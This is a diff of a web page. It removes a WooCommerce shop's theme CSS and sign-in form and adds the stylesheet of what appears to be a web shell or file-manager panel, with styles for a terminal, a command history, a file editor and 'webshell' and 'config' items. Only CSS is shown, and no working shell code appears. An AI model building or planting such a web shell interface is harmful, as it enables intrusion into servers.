.widget_shopping_cart_content > .total .amount,.color-scheme-light .vc_tta-tabs.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tab.vc_active > a,.wpb-js-composer .vc_tta.vc_general.vc_tta-style-classic .vc_tta-tab.vc_active > a,.basel-free-progress-bar .amount{color:#000000;}.wishlist-info-widget .icon-count,.compare-info-widget .icon-count,.basel-toolbar-compare .compare-count,.basel-cart-design-2 > a .basel-cart-number,.basel-cart-design-3 > a .basel-cart-number,.basel-sticky-sidebar-opener:not(.sticky-toolbar):hover,.btn.btn-color-primary,.button.btn-color-primary,button.btn-color-primary,.added_to_cart.btn-color-primary,input[type=submit].btn-color-primary,.btn.btn-color-primary:hover,.button.btn-color-primary:hover,button.btn-color-primary:hover,.added_to_cart.btn-color-primary:hover,input[type=submit].btn-color-primary:hover,.btn.btn-color-primary.btn-style-bordered:hover,.button.btn-color-primary.btn-style-bordered:hover,button.btn-color-primary.btn-style-bordered:hover,.added_to_cart.btn-color-primary.btn-style-bordered:hover,input[type=submit].btn-color-primary.btn-style-bordered:hover,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:hover,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:hover,.no-results .searchform #searchsubmit,.no-results .searchform #searchsubmit:hover,.comments-area .comment-respond input[type=submit],.comments-area .comment-respond input[type=submit]:hover,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:hover,.woocommerce .checkout_coupon .button,.woocommerce .checkout_coupon .button:hover,.woocommerce .place-order button,.woocommerce .place-order button:hover,.woocommerce-order-pay #order_review .button,.woocommerce-order-pay #order_review .button:hover,.woocommerce-account button[name=track],.woocommerce-account button[name=track]:hover,.woocommerce-account button[name=save_account_details],.woocommerce-account button[name=save_account_details]:hover,.woocommerce-account button[name=save_address],.woocommerce-account button[name=save_address]:hover,.search-no-results .not-found .entry-content .searchform #searchsubmit,.search-no-results .not-found .entry-content .searchform #searchsubmit:hover,.error404 .page-content > .searchform #searchsubmit,.error404 .page-content > .searchform #searchsubmit:hover,.return-to-shop .button,.return-to-shop .button:hover,.basel-hover-excerpt .btn-add a,.basel-hover-excerpt .btn-add a:hover,.basel-hover-standard .btn-add > a,.basel-hover-standard .btn-add > a:hover,.basel-price-table .basel-plan-footer > a,.basel-price-table .basel-plan-footer > a:hover,.basel-pf-btn button,.basel-pf-btn button:hover,.basel-info-box.box-style-border .info-btn-wrapper a,.basel-info-box.box-style-border .info-btn-wrapper a:hover,.basel-info-box2.box-style-border .info-btn-wrapper a,.basel-info-box2.box-style-border .info-btn-wrapper a:hover,.basel-hover-quick .woocommerce-variation-add-to-cart .button,.basel-hover-quick .woocommerce-variation-add-to-cart .button:hover,.product-list-item .product-list-buttons > a,.product-list-item .product-list-buttons > a:hover,.wpb_video_wrapper .button-play,.pswp__share--download:hover,.basel-navigation .menu > li.callto-btn > a,.basel-navigation .menu > li.callto-btn > a:hover,.basel-dark .basel-load-more:hover,.basel-dark .basel-load-more.load-on-click + .basel-load-more-loader,.basel-dark .feedback-form .wpcf7-submit,.basel-dark .mc4wp-form input[type=submit],.basel-dark .single_add_to_cart_button,.basel-dark .basel-buy-now-btn,.basel-dark .basel-compare-col .add_to_cart_button,.basel-dark .basel-compare-col .added_to_cart,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart,.basel-dark .single-product-content .comment-form .form-submit input[type=submit],.basel-dark .basel-registration-page .basel-switch-to-register,.basel-dark .register .button, .basel-dark .login .button,.basel-dark .lost_reset_password .button,.basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button, .basel-dark .woocommerce .cart-actions .coupon .button,.basel-dark .feedback-form .wpcf7-submit:hover,.basel-dark .mc4wp-form input[type=submit]:hover,.basel-dark .single_add_to_cart_button:hover,.basel-dark .basel-buy-now-btn:hover,.basel-dark .basel-compare-col .add_to_cart_button:hover,.basel-dark .basel-compare-col .added_to_cart:hover,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:hover,.basel-dark .single-product-content .comment-form .form-submit input[type=submit]:hover,.basel-dark .basel-registration-page .basel-switch-to-register:hover, .basel-dark .register .button:hover, .basel-dark .login .button:hover, .basel-dark .lost_reset_password .button:hover, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:hover,.basel-dark .woocommerce .cart-actions .coupon .button:hover,.basel-progress-bar .progress-bar,.widget_price_filter .ui-slider .ui-slider-handle:after,.widget_price_filter .ui-slider .ui-slider-range,.widget_tag_cloud .tagcloud a:hover,.widget_product_tag_cloud .tagcloud a:hover,div.bbp-submit-wrapper button,div.bbp-submit-wrapper button:hover,#bbpress-forums .bbp-search-form #bbp_search_submit,#bbpress-forums .bbp-search-form #bbp_search_submit:hover,body .select2-container--default .select2-results__option--highlighted[aria-selected], .basel-add-img-msg:before,.product-video-button a:hover:before, .product-360-button a:hover:before,.mobile-nav ul li .up-icon,.scrollToTop:hover,.basel-sticky-filter-btn:hover,.categories-opened li a:active,.basel-price-table .basel-plan-price,.header-categories .secondary-header .mega-navigation,.widget_nav_mega_menu,.meta-post-categories,.slider-title:before,.title-wrapper.basel-title-style-simple .title:after,.menu-label-new,.product-label.onsale,.color-scheme-light .vc_tta-tabs.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tab.vc_active > a span:after,.wpb-js-composer .vc_tta.vc_general.vc_tta-style-classic .vc_tta-tab.vc_active > a span:after,.portfolio-with-bg-alt .portfolio-entry:hover .entry-header > .portfolio-info{background-color:#000000;}.btn.btn-color-primary,.button.btn-color-primary,button.btn-color-primary,.added_to_cart.btn-color-primary,input[type=submit].btn-color-primary,.btn.btn-color-primary:hover,.button.btn-color-primary:hover,button.btn-color-primary:hover,.added_to_cart.btn-color-primary:hover,input[type=submit].btn-color-primary:hover,.btn.btn-color-primary.btn-style-bordered:hover,.button.btn-color-primary.btn-style-bordered:hover,button.btn-color-primary.btn-style-bordered:hover,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:hover,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:hover,.comments-area .comment-respond input[type=submit],.comments-area .comment-respond input[type=submit]:hover,.sidebar-container .mc4wp-form input[type=submit],.sidebar-container .mc4wp-form input[type=submit]:hover,.footer-container .mc4wp-form input[type=submit],.footer-container .mc4wp-form input[type=submit]:hover,.filters-area .mc4wp-form input[type=submit],.filters-area .mc4wp-form input[type=submit]:hover,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:hover,.woocommerce .checkout_coupon .button,.woocommerce .checkout_coupon .button:hover,.woocommerce .place-order button,.woocommerce .place-order button:hover,.woocommerce-order-pay #order_review .button,.woocommerce-order-pay #order_review .button:hover,.woocommerce-account button[name=track],.woocommerce-account button[name=track]:hover,.woocommerce-account button[name=save_account_details],.woocommerce-account button[name=save_account_details]:hover,.woocommerce-account button[name=save_address],.woocommerce-account button[name=save_address]:hover,.woocommerce-page button[name=save_address]:hover,.search-no-results .not-found .entry-content .searchform #searchsubmit,.search-no-results .not-found .entry-content .searchform #searchsubmit:hover,.error404 .page-content > .searchform #searchsubmit,.error404 .page-content > .searchform #searchsubmit:hover,.no-results .searchform #searchsubmit,.no-results .searchform #searchsubmit:hover,.return-to-shop .button,.return-to-shop .button:hover,.basel-hover-excerpt .btn-add a,.basel-hover-excerpt .btn-add a:hover,.basel-hover-standard .btn-add > a,.basel-hover-standard .btn-add > a:hover,.basel-price-table .basel-plan-footer > a,.basel-price-table .basel-plan-footer > a:hover,.basel-pf-btn button,.basel-pf-btn button:hover,body .basel-info-box.box-style-border .info-btn-wrapper a,body .basel-info-box.box-style-border .info-btn-wrapper a:hover,body .basel-info-box2.box-style-border .info-btn-wrapper a,body .basel-info-box2.box-style-border .info-btn-wrapper a:hover,.basel-hover-quick .woocommerce-variation-add-to-cart .button,.basel-hover-quick .woocommerce-variation-add-to-cart .button:hover,.product-list-item .product-list-buttons > a,.product-list-item .product-list-buttons > a:hover,body .wpb_video_wrapper .button-play,.woocommerce-store-notice__dismiss-link:hover,.basel-compare-table .compare-loader:after,.basel-sticky-sidebar-opener:not(.sticky-toolbar):hover,.basel-dark .read-more-section .btn-read-more,.basel-dark .basel-load-more,.basel-dark .basel-load-more:hover,.basel-dark .feedback-form .wpcf7-submit,.basel-dark .mc4wp-form input[type=submit],.basel-dark .single_add_to_cart_button,.basel-dark .basel-buy-now-btn,.basel-dark .basel-compare-col .add_to_cart_button,.basel-dark .basel-compare-col .added_to_cart,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart,.basel-dark .single-product-content .comment-form .form-submit input[type=submit],.basel-dark .basel-registration-page .basel-switch-to-register,.basel-dark .register .button, .basel-dark .login .button,.basel-dark .lost_reset_password .button,.basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button, .basel-dark .woocommerce .cart-actions .coupon .button,.basel-dark .feedback-form .wpcf7-submit:hover,.basel-dark .mc4wp-form input[type=submit]:hover,.basel-dark .single_add_to_cart_button:hover,.basel-dark .basel-buy-now-btn:hover,.basel-dark .basel-compare-col .add_to_cart_button:hover,.basel-dark .basel-compare-col .added_to_cart:hover,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:hover,.basel-dark .single-product-content .comment-form .form-submit input[type=submit]:hover,.basel-dark .basel-registration-page .basel-switch-to-register:hover,.basel-dark .register .button:hover, .basel-dark .login .button:hover,.basel-dark .lost_reset_password .button:hover,.basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:hover,.basel-dark .woocommerce .cart-actions .coupon .button:hover,.cookies-buttons .cookies-accept-btn:hover,.blockOverlay:after,.widget_shopping_cart li.basel-loading:after,.basel-price-table:hover,.title-shop .nav-shop ul li a:after,.widget_tag_cloud .tagcloud a:hover,.widget_product_tag_cloud .tagcloud a:hover,div.bbp-submit-wrapper button,div.bbp-submit-wrapper button:hover,#bbpress-forums .bbp-search-form #bbp_search_submit,#bbpress-forums .bbp-search-form #bbp_search_submit:hover,.basel-hover-link .swap-elements .btn-add a,.basel-hover-link .swap-elements .btn-add a:hover,.basel-hover-link .swap-elements .btn-add a.loading:after,.scrollToTop:hover, .basel-sticky-filter-btn:hover,blockquote{border-color:#000000;}.with-animation .info-box-icon svg path,.single-product-content .entry-summary .basel-sizeguide-btn:hover svg{stroke:#000000;}.btn.btn-color-alt.btn-style-bordered, .button.btn-color-alt.btn-style-bordered, button.btn-color-alt.btn-style-bordered, .added_to_cart.btn-color-alt.btn-style-bordered, input[type=submit].btn-color-alt.btn-style-bordered,.title-wrapper.basel-title-color-alt .title-subtitle{color:#e6b38f;}.btn.btn-color-alt, .button.btn-color-alt, button.btn-color-alt, .added_to_cart.btn-color-alt, input[type=submit].btn-color-alt,.btn.btn-color-alt:hover,.button.btn-color-alt:hover,button.btn-color-alt:hover,.added_to_cart.btn-color-alt:hover,input[type=submit].btn-color-alt:hover,.btn.btn-color-alt.btn-style-bordered:hover,.button.btn-color-alt.btn-style-bordered:hover,button.btn-color-alt.btn-style-bordered:hover,.added_to_cart.btn-color-alt.btn-style-bordered:hover,input[type=submit].btn-color-alt.btn-style-bordered:hover,.widget_nav_mega_menu .menu > li:hover, .mega-navigation .menu > li:hover{background-color:#e6b38f;}.btn.btn-color-alt,.button.btn-color-alt,button.btn-color-alt,.added_to_cart.btn-color-alt,input[type=submit].btn-color-alt,.btn.btn-color-alt:hover,.button.btn-color-alt:hover,button.btn-color-alt:hover,.added_to_cart.btn-color-alt:hover,input[type=submit].btn-color-alt:hover,.btn.btn-color-alt.btn-style-bordered:hover,.button.btn-color-alt.btn-style-bordered:hover,button.btn-color-alt.btn-style-bordered:hover,.added_to_cart.btn-color-alt.btn-style-bordered:hover,input[type=submit].btn-color-alt.btn-style-bordered:hover{border-color:#e6b38f;}.button, 
-button, 
-input[type=submit],
-html .yith-woocompare-widget a.button.compare,
-html .basel-dark .basel-registration-page .basel-switch-to-register,
-html .basel-dark .login .button,
-html .basel-dark .register .button,
-html .basel-dark .widget_shopping_cart .buttons a,
-html .basel-dark .yith-woocompare-widget a.button.compare,
-html .basel-dark .widget_price_filter .price_slider_amount .button,
-html .basel-dark .woocommerce-widget-layered-nav-dropdown__submit,
-html .basel-dark .basel-widget-layered-nav-dropdown__submit,
-html .basel-dark .woocommerce .cart-actions input[name="update_cart"]{background-color:#e6b38f;}.button, 
-button, 
-input[type=submit],
-html .yith-woocompare-widget a.button.compare,
-html .basel-dark .basel-registration-page .basel-switch-to-register,
-html .basel-dark .login .button,
-html .basel-dark .register .button,
-html .basel-dark .widget_shopping_cart .buttons a,
-html .basel-dark .yith-woocompare-widget a.button.compare,
-html .basel-dark .widget_price_filter .price_slider_amount .button,
-html .basel-dark .woocommerce-widget-layered-nav-dropdown__submit,
-html .basel-dark .basel-widget-layered-nav-dropdown__submit,
-html .basel-dark .woocommerce .cart-actions input[name="update_cart"]{border-color:#e6b38f;}.button:hover, 
-button:hover, 
-input[type=submit]:hover,
-html .yith-woocompare-widget a.button.compare:hover,
-html .basel-dark .basel-registration-page .basel-switch-to-register:hover,
-html .basel-dark .login .button:hover,
-html .basel-dark .register .button:hover,
-html .basel-dark .widget_shopping_cart .buttons a:hover,
-html .basel-dark .yith-woocompare-widget a.button.compare:hover,
-html .basel-dark .widget_price_filter .price_slider_amount .button:hover,
-html .basel-dark .woocommerce-widget-layered-nav-dropdown__submit:hover,
-html .basel-dark .basel-widget-layered-nav-dropdown__submit:hover,
-html .basel-dark .woocommerce .cart-actions input[name="update_cart"]:hover{background-color:#000000;}.button:hover, 
-button:hover, 
-input[type=submit]:hover,
-html .yith-woocompare-widget a.button.compare:hover,
-html .basel-dark .basel-registration-page .basel-switch-to-register:hover,
-html .basel-dark .login .button:hover,
-html .basel-dark .register .button:hover,
-html .basel-dark .widget_shopping_cart .buttons a:hover,
-html .basel-dark .yith-woocompare-widget a.button.compare:hover,
-html .basel-dark .widget_price_filter .price_slider_amount .button:hover,
-html .basel-dark .woocommerce-widget-layered-nav-dropdown__submit:hover,
-html .basel-dark .basel-widget-layered-nav-dropdown__submit:hover,
-html .basel-dark .woocommerce .cart-actions input[name="update_cart"]:hover{border-color:#000000;}html .basel-hover-alt .btn-add>a{color:#e6b38f;}html .single_add_to_cart_button,
-html .basel-buy-now-btn,
-html .basel-sticky-btn .basel-sticky-add-to-cart,
-html .woocommerce .cart-actions .coupon .button,
-html .added_to_cart.btn-color-black, 
-html input[type=submit].btn-color-black,
-html .wishlist_table tr td.product-add-to-cart>.add_to_cart.button,
-html .basel-hover-quick .quick-shop-btn > a,
-html table.compare-list tr.add-to-cart td a,
-html .basel-compare-col .add_to_cart_button, 
-html .basel-compare-col .added_to_cart{background-color:#e6b38f;}html .single_add_to_cart_button,
-html .basel-buy-now-btn,
-html .basel-sticky-btn .basel-sticky-add-to-cart,
-html .woocommerce .cart-actions .coupon .button,
-html .added_to_cart.btn-color-black, 
-html input[type=submit].btn-color-black,
-html .wishlist_table tr td.product-add-to-cart>.add_to_cart.button,
-html .basel-hover-quick .quick-shop-btn > a,
-html table.compare-list tr.add-to-cart td a,
-html .basel-compare-col .add_to_cart_button, 
-html .basel-compare-col .added_to_cart{border-color:#e6b38f;}html .basel-hover-alt .btn-add>a:hover{color:#000000;}html .single_add_to_cart_button:hover,
-html .basel-buy-now-btn:hover,
-html .basel-sticky-btn .basel-sticky-add-to-cart:hover,
-html .woocommerce .cart-actions .coupon .button:hover,
-html .added_to_cart.btn-color-black:hover, 
-html input[type=submit].btn-color-black:hover,
-html .wishlist_table tr td.product-add-to-cart>.add_to_cart.button:hover,
-html .basel-hover-quick .quick-shop-btn > a:hover,
-html table.compare-list tr.add-to-cart td a:hover,
-html .basel-compare-col .add_to_cart_button:hover, 
-html .basel-compare-col .added_to_cart:hover{background-color:#000000;}html .single_add_to_cart_button:hover,
-html .basel-buy-now-btn:hover,
-html .basel-sticky-btn .basel-sticky-add-to-cart:hover,
-html .woocommerce .cart-actions .coupon .button:hover,
-html .added_to_cart.btn-color-black:hover, 
-html input[type=submit].btn-color-black:hover,
-html .wishlist_table tr td.product-add-to-cart>.add_to_cart.button:hover,
-html .basel-hover-quick .quick-shop-btn > a:hover,
-html table.compare-list tr.add-to-cart td a:hover,
-html .basel-compare-col .add_to_cart_button:hover, 
-html .basel-compare-col .added_to_cart:hover{border-color:#000000;}@font-face {
-			font-weight: normal;
-			font-style: normal;
-			font-family: "simple-line-icons";
-			src: url("//bolsomadrid.com/wp-content/themes/basel/fonts/Simple-Line-Icons.woff2?v=5.9.0") format("woff2"),
-			url("//bolsomadrid.com/wp-content/themes/basel/fonts/Simple-Line-Icons.woff?v=5.9.0") format("woff");}@font-face {
-			font-weight: normal;
-			font-style: normal;
-			font-family: "basel-font";
-			src: url("//bolsomadrid.com/wp-content/themes/basel/fonts/basel-font.woff2?v=5.9.0") format("woff2"),
-			url("//bolsomadrid.com/wp-content/themes/basel/fonts/basel-font.woff?v=5.9.0") format("woff");}.gform_wrapper .gform_footer input.button, .gform_wrapper .gform_footer input[type=submit], .gform_wrapper .gform_page_footer input.button, .gform_wrapper .gform_page_footer input[type=submit]{
-    COLOR: #FFFFFF;
-}</style></head>
+        .header-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            text-decoration: none;
+            transition: var(--transition);
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+        }
 
-<body class="wp-singular page-template-default page page-id-1529 wp-theme-basel theme-basel woocommerce-no-js eio-default yith-wcbm-theme-basel wrapper-full-width global-cart-design-2 global-search-full-screen global-header-simple mobile-nav-from-left basel-light catalog-mode-off categories-accordion-on global-wishlist-enable basel-top-bar-on basel-ajax-shop-on basel-ajax-search-on enable-sticky-header header-full-width sticky-header-clone offcanvas-sidebar-mobile offcanvas-sidebar-tablet login-see-prices elementor-default elementor-kit-24914">
-					<div class="login-form-side woocommerce">
-				<div class="widget-heading">
-					<span class="widget-title">Sign in</span>
-					<a href="#" rel="nofollow" class="widget-close">close</a>
-				</div>
-				
-				<div class="login-form">
-							<form method="post" class="login woocommerce-form woocommerce-form-login " action="https://bolsomadrid.com/mi-cuenta" >
+        .header-icon:hover {
+            background: var(--secondary);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+        }
+        
+        .login-info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-left: auto;
+        }
+        
+        .logout-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+            padding: 5px 12px;
+            border-radius: 15px;
+            text-decoration: none;
+            font-size: 11px;
+            transition: all 0.3s ease;
+            margin-left: 10px;
+        }
+        
+        .logout-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: translateY(-1px);
+        }
+                
+        .section { 
+            background: var(--card-bg); 
+            margin-bottom: 20px; 
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: var(--shadow);
+            border: none;
+        }
+        
+        .file-list { 
+            margin: 15px 0; 
+        }
+        
+        .file-item { 
+            padding: 12px 15px; 
+            border-bottom: 1px solid var(--border-color); 
+            display: flex; 
+            align-items: center;
+            transition: var(--transition);
+            flex-wrap: wrap;
+            border-radius: 5px;
+            position: relative;
+            cursor: pointer;
+        }
+        
+        .file-item:hover { 
+            background: #f1f8ff; 
+            transform: translateY(-2px);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        .file-item.selected {
+            background: #e3f2fd;
+            border-left: 3px solid var(--secondary);
+        }
+        
+        .file-name { 
+            flex: 1; 
+            font-size: 14px; 
+            font-family: 'Roboto Mono', monospace; 
+            min-width: 200px;
+            word-break: break-all;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .file-actions { 
+            display: flex; 
+            gap: 8px; 
+            flex-wrap: wrap;
+            margin: 5px 0;
+        }
+        
+        .btn { 
+            background: var(--secondary); 
+            color: #ffffff; 
+            border: none; 
+            padding: 8px 14px; 
+            cursor: pointer; 
+            text-decoration: none; 
+            font-size: 12px; 
+            font-family: 'Inter', sans-serif;
+            border-radius: 5px;
+            transition: var(--transition);
+            font-weight: 500;
+            white-space: nowrap;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .btn:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        
+        .btn:disabled {
+            background: #adb5bd;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-danger { 
+            background: var(--accent); 
+        }
+        
+        .btn-success { 
+            background: var(--success); 
+        }
+        
+        .btn-warning { 
+            background: var(--warning); 
+            color: #000; 
+        }
+        
+        .btn-info { 
+            background: var(--info); 
+        }
+        
+        .btn-secondary { 
+            background: var(--text-secondary); 
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+        }
+        
+        input, textarea, select { 
+            background: #ffffff; 
+            color: var(--text-primary); 
+            border: 1px solid var(--border-color); 
+            padding: 10px; 
+            margin: 5px 0;
+            font-family: 'Roboto Mono', monospace;
+            border-radius: 5px;
+            width: 100%;
+            font-size: 14px;
+            transition: var(--transition);
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--secondary);
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+        }
+        
+        .terminal { 
+            background: var(--card-bg); 
+            border: none; 
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: var(--shadow);
+        }
+        
+        .terminal-output { 
+            background: #2c3e50; 
+            color: #ecf0f1; 
+            height: 400px; 
+            overflow-y: auto; 
+            overflow-x: auto;
+            padding: 15px; 
+            border: none; 
+            margin-bottom: 15px; 
+            font-family: 'Roboto Mono', monospace;
+            font-size: 13px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .terminal-input { 
+            width: 100%; 
+            background: #ffffff; 
+            color: var(--text-primary); 
+            border: 1px solid var(--border-color); 
+            padding: 12px;
+            font-family: 'Roboto Mono', monospace;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        
+        .modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.5); 
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content { 
+            background: var(--card-bg); 
+            margin: 40px auto; 
+            padding: 30px; 
+            border: none;
+            width: 90%; 
+            max-width: 800px; 
+            max-height: 85vh; 
+            overflow-y: auto;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            position: relative;
+        }
+        
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--secondary), var(--accent));
+            border-radius: 10px 10px 0 0;
+        }
+        
+        .breadcrumb { 
+            margin-bottom: 20px; 
+            padding: 15px; 
+            background: var(--card-bg); 
+            border: none;
+            border-radius: 10px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 13px;
+            word-break: break-all;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .breadcrumb a { 
+            color: var(--secondary); 
+            text-decoration: none; 
+            font-weight: 500; 
+        }
+        
+        .breadcrumb a:hover { 
+            text-decoration: underline; 
+            color: var(--primary); 
+        }
+        
+        .current-path { 
+            background: var(--card-bg); 
+            padding: 12px; 
+            border: none; 
+            margin: 15px 0; 
+            font-family: 'Roboto Mono', monospace;
+            border-radius: 5px;
+            font-size: 13px;
+            word-break: break-all;
+            box-shadow: var(--shadow);
+        }
+        
+        .home-btn { 
+            background: var(--secondary); 
+            color: white; 
+            border: none; 
+            padding: 8px 16px; 
+            cursor: pointer; 
+            text-decoration: none; 
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-left: 15px;
+            border-radius: 5px;
+            font-weight: 500;
+            transition: var(--transition);
+            font-size: 13px;
+        }
+        
+        .bayy { 
+            background: var(--border-color); 
+            color: white; 
+            border: none; 
+            padding: 8px 16px; 
+            cursor: pointer; 
+            text-decoration: none; 
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-left: 15px;
+            border-radius: 5px;
+            font-weight: 500;
+            transition: var(--transition);
+            font-size: 13px;
+        }
+        
+        .home-btn:hover { 
+            background: #2980b9;
+            text-decoration: none;
+            color: #ffffff;
+            transform: translateY(-2px);
+        }
+        
+        .file-info { 
+            font-size: 11px; 
+            color: var(--text-secondary); 
+            margin-left: 15px; 
+            font-family: 'Roboto Mono', monospace; 
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        
+        .dir-link { 
+            color: var(--secondary); 
+            text-decoration: none; 
+            font-weight: 500; 
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .dir-link:hover { 
+            text-decoration: underline; 
+            color: var(--primary); 
+        }
+        
+        .icon-folder { 
+            color: var(--warning); 
+        }
+        
+        .icon-file { 
+            color: var(--info); 
+        }
+        
+        .toolbar { 
+            display: flex; 
+            gap: 10px; 
+            margin-bottom: 20px; 
+            flex-wrap: wrap;
+        }
+        
+        .system-info {
+            background: var(--card-bg);
+            color: var(--text-primary);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 12px;
+            border: none;
+            word-break: break-all;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .system-info::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--secondary), var(--accent));
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 15px;
+        }
+        
+        .nano-editor {
+            background: #2c3e50;
+            color: #ecf0f1;
+            border: none;
+            padding: 10px;
+            font-family: 'Roboto Mono', monospace;
+            width: 100%;
+            height: 500px;
+            resize: both;
+            overflow: auto;
+            font-size: 13px;
+            border-radius: 5px;
+        }
+        
+        .nano-header {
+            background: #34495e;
+            padding: 10px;
+            border-bottom: 1px solid #2c3e50;
+            font-family: 'Roboto Mono', monospace;
+            margin-bottom: 10px;
+            color: #ecf0f1;
+            font-size: 13px;
+            border-radius: 5px 5px 0 0;
+        }
+        
+        .tab-container {
+            margin-bottom: 20px;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            border-bottom: 2px solid var(--border-color);
+            flex-wrap: wrap;
+            background: var(--card-bg);
+            border-radius: 10px 10px 0 0;
+            padding: 5px 5px 0 5px;
+            box-shadow: var(--shadow);
+        }
+        
+        .tab-button {
+            padding: 12px 24px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+            font-family: 'Inter', sans-serif;
+            font-weight: 500;
+            color: var(--text-secondary);
+            transition: var(--transition);
+            position: relative;
+        }
+        
+        .tab-button.active {
+            background: var(--card-bg);
+            color: var(--primary);
+            font-weight: 600;
+        }
+        
+        .tab-button.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--secondary);
+            border-radius: 3px 3px 0 0;
+        }
+        
+        .tab-button:hover {
+            background: rgba(52, 152, 219, 0.1);
+            color: var(--secondary);
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 20px;
+            border: none;
+            background: var(--card-bg);
+            border-radius: 0 0 10px 10px;
+            box-shadow: var(--shadow);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+        
+        .command-history {
+            background: #ecf0f1;
+            border: 1px solid #bdc3c7;
+            border-radius: 5px;
+            padding: 5px;
+            margin-bottom: 10px;
+            font-size: 12px;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+        
+        .command-item {
+            padding: 2px 5px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: var(--transition);
+        }
+        
+        .command-item:hover {
+            background: #d5dbdb;
+        }
+        
+        .loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        
+        .terminal-prompt {
+            color: var(--success);
+            font-weight: bold;
+        }
+        
+        .terminal-output-line {
+            margin: 2px 0;
+        }
+        
+        .webshell-item {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 5px 0;
+            transition: var(--transition);
+        }
+        
+        .webshell-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .config-item {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 5px 0;
+            transition: var(--transition);
+        }
+        
+        .config-item:hover {
+            transform: translateY(-2px);
